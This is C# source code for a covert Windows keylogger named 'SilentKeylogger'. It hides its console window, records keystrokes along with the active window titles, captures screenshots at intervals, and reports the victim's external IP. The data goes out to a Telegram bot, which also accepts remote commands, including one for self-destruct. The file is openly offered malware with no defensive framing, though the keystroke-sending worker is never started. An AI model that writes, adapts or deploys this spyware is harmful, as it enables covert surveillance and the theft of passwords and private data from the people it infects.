// Required .NET Framework 4.x

using System;
using System.IO;
using System.Text;
using System.Net.Http;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing;
using Microsoft.Win32;

namespace SilentKeylogger
{
    class Program
    {
        static string botToken = "YOUR_BOT_TOKEN";
        static string chatId = "YOUR_CHAT_ID";

        static StringBuilder keylogs = new StringBuilder();
        static readonly object keylogsLock = new object();

        static int screenshotInterval = 30;

        static HttpClient httpClient = new HttpClient();

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        static void Main(string[] args)
        {
            HideConsoleWindow();

            Thread keyloggerThread = new Thread(KeyloggerWorker);
            Thread screenshotThread = new Thread(ScreenshotWorker);
            Thread commandListenerThread = new Thread(CommandListenerWorker);
            
            keyloggerThread.Start();
            screenshotThread.Start();
            commandListenerThread.Start();

            SendInitialMessage();

            keyloggerThread.Join();
            screenshotThread.Join();
            commandListenerThread.Join();
        }

        static void HideConsoleWindow()
        {
            var handle = Process.GetCurrentProcess().MainWindowHandle;
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, 0);
            }
        }

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void KeyloggerWorker()
        {
            while (true)
            {
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState((int)key) == -32767)
                    {
                        string keyString = KeyToString(key);
                        string activeWindow = GetActiveWindowTitle();

                        lock (keylogsLock)
                        {
                            keylogs.Append($"{keyString} (on {activeWindow}) ");
                        }
                    }
                }
                Thread.Sleep(10);
            }
        }

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        static string KeyToString(Keys key)
        {
            switch (key)
            {
                case Keys.Space: return " ";
                case Keys.Enter: return "\n";
                case Keys.Tab: return "\t";
                case Keys.Back: return "[BACKSPACE]";
                case Keys.Escape: return "[ESC]";
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return "[SHIFT]";
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return "[CTRL]";
                case Keys.Menu:
                case Keys.LMenu:
                case Keys.RMenu:
                    return "[ALT]";
                default:
                    string s = key.ToString();
                    if (s.Length == 1)
                        return s;
                    else
                        return $"[{s}]";
            }
        }

        static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return "Unknown";
        }

        static void SendInitialMessage()
        {
            string ip = GetExternalIP();
            string msg = $"🕵️‍♂️ *Victim Keylogged!*\nIP: `{ip}`\nScript started stealthily.";
            SendTelegramMessage(msg);
        }

        static string GetExternalIP()
        {
            try
            {
                var response = httpClient.GetStringAsync("https://api.ipify.org").Result;
                return response;
            }
            catch
            {
                return "Unknown IP";
            }
        }

        // Worker para tirar screenshot e enviar com base no intervalo
        static void ScreenshotWorker()
        {
            while (true)
            {
                Thread.Sleep(screenshotInterval * 1000);

                try
                {
                    string base64Screenshot = CaptureScreenshotBase64();
                    if (!string.IsNullOrEmpty(base64Screenshot))
                    {
                        SendTelegramPhoto(base64Screenshot, "🖼️ Screenshot");
                    }
                }
                catch
                {

                }
            }
        }

        static string CaptureScreenshotBase64()
        {
            try
            {
                using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch
            {
                return "";
            }
        }

        static void SendLogsWorker()
        {
            while (true)
            {
                Thread.Sleep(30000);

                string logsToSend = null;
                lock (keylogsLock)
                {
                    if (keylogs.Length > 0)
                    {
                        logsToSend = Convert.ToBase64String(Encoding.UTF8.GetBytes(keylogs.ToString()));
                        keylogs.Clear();
                    }
                }
                if (logsToSend != null)
                {
                    SendTelegramMessage($"⌨️ Logs (last 30s) in Base64:\n`{logsToSend}`");
                }
            }
        }

        static void CommandListenerWorker()
        {
            int offset = 0;
            while (true)
            {
                try
                {
                    string url = $"https://api.telegram.org/bot{botToken}/getUpdates?offset={offset + 1}";
                    var response = httpClient.GetStringAsync(url).Result;
                    dynamic json = Newtonsoft.Json.JsonConvert.DeserializeObject(response);

                    foreach (var result in json.result)
                    {
                        offset = Math.Max(offset, (int)result.update_id);

                        string text = result.message?.text;
                        if (text != null)
                        {
                            if (text.StartsWith("/screenshot_interval "))
                            {
                                string[] parts = text.Split(' ');
                                if (parts.Length == 2 && int.TryParse(parts[1], out int newInterval))
                                {
                                    screenshotInterval = newInterval;
                                    SendTelegramMessage($"🛠️ Screenshot interval changed to {newInterval} seconds.");
                                }
                            }
                            else if (text == "/selfdestruct")
                            {
                                SendTelegramMessage("💥 Self destruct initiated. Exiting.");
                                Environment.Exit(0);
                            }
                        }
                    }
                }
                catch
                {
                    
                }
                Thread.Sleep(5000);
            }
        }

        static void SendTelegramMessage(string text)
        {
            try
            {
                var values = new MultipartFormDataContent
                {
                    { new StringContent(chatId), "chat_id" },
                    { new StringContent(text), "text" },
                    { new StringContent("Markdown"), "parse_mode" }
                };

                var response = httpClient.PostAsync($"https://api.telegram.org/bot{botToken}/sendMessage", values).Result;
            }
            catch { }
        }

        static void SendTelegramPhoto(string base64Image, string caption = "")
        {
            try
            {
                byte[] imageBytes = Convert.FromBase64String(base64Image);
                var content = new MultipartFormDataContent
                {
                    { new StringContent(chatId), "chat_id" },
                    { new ByteArrayContent(imageBytes), "photo", "screenshot.png" },
                    { new StringContent(caption), "caption" },
                    { new StringContent("Markdown"), "parse_mode" }
                };

                var response = httpClient.PostAsync($"https://api.telegram.org/bot{botToken}/sendPhoto", content).Result;
            }
            catch { }
        }
    }
}
